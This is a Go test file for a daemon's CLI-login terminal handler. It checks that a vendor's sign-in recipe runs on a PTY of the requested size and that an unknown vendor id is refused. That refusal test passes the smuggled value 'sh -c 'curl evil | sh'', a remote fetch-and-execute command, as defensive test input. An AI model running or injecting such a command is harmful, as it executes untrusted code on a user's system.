package daemonruntime

import (
	"context"
	"encoding/json"
	"io"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
)

func cliLoginPayload(t *testing.T, req map[string]any) []byte {
	t.Helper()
	payload, err := json.Marshal(req)
	require.NoError(t, err)
	return payload
}

// The command runs the daemon's own recipe for the vendor named, on a PTY of
// the size asked for, and the session streams like any terminal's.
func TestHandleTerminalCreateCLILogin_RunsTheDaemonsRecipeOnAPTY(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("the sign-in recipes are POSIX sh scripts")
	}
	m := useTerminalManager(t)
	var asked string
	previous := cliLoginScript
	cliLoginScript = func(id string) (string, error) {
		asked = id
		return "stty size; printf 'signed in\\n'", nil
	}
	t.Cleanup(func() { cliLoginScript = previous })

	out, err := handleTerminalCreateCLILogin(context.Background(),
		cliLoginPayload(t, map[string]any{"vendor": "claude", "cols": 120, "rows": 40}))
	require.NoError(t, err)
	require.Equal(t, "claude", asked)

	var resp terminalCreateResponse
	require.NoError(t, json.Unmarshal(out, &resp))
	require.NotEmpty(t, resp.SessionID)

	var got strings.Builder
	buf := make([]byte, 4096)
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) && !strings.Contains(got.String(), "signed in") {
		n, err := m.Read(resp.SessionID, buf)
		got.Write(buf[:n])
		if err != nil {
			require.ErrorIs(t, err, io.EOF)
			break
		}
	}
	require.Contains(t, got.String(), "40 120", "the PTY starts at the size the person's terminal has")
	require.Contains(t, got.String(), "signed in")
}

// The server never sends a command line: an id the daemon's table does not
// know is refused, and nothing starts.
func TestHandleTerminalCreateCLILogin_RefusesAnUnknownVendor(t *testing.T) {
	m := useTerminalManager(t)

	_, err := handleTerminalCreateCLILogin(context.Background(),
		cliLoginPayload(t, map[string]any{"vendor": "sh -c 'curl evil | sh'"}))

	require.Error(t, err)
	require.Contains(t, err.Error(), "unknown vendor CLI")
	require.Empty(t, m.ListSessions())
}

func TestHandleTerminalCreateCLILogin_IsRegistered(t *testing.T) {
	_, ok := DefaultRegistry().handlers[TerminalCreateCLILoginCommand]
	require.True(t, ok, "%s must be a daemon command", TerminalCreateCLILoginCommand)
}
